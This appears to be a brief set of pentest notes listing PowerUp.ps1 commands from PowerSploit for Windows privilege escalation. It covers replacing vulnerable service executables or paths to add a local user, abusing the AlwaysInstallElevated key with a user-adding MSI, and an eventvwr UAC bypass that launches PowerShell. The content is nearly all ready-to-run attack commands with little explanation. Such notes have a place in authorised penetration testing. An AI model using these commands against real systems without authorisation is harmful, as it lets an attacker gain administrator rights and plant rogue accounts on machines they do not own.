### Source
https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Privesc/PowerUp.ps1  

### Run all checks and prevent script from terminating if one test fail
```
Invoke-PrivescAudit -ErrorAction SilentlyContinue -Format html
```

### Replace vulnerable service exe and add new user (improper write permissions on file)
```
Write-ServiceEXE -ServiceName <name> -UserName <newUser> -Password <newPassword> -Verbose
```

### Replace vulnerable service path and add new user (stop service, rewrite path, start service)
```
Invoke-ServiceUserAdd -ServiceName <name> -UserName <newUser> -Password <newPassword> -Verbose
```

### Use AlwaysInstallElevated key and add new user (need a GUI)
```
Write-UserAddMSI -Verbose
```

### Test for UAC bypass
```
Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe mkdir C:\testUAC"
```

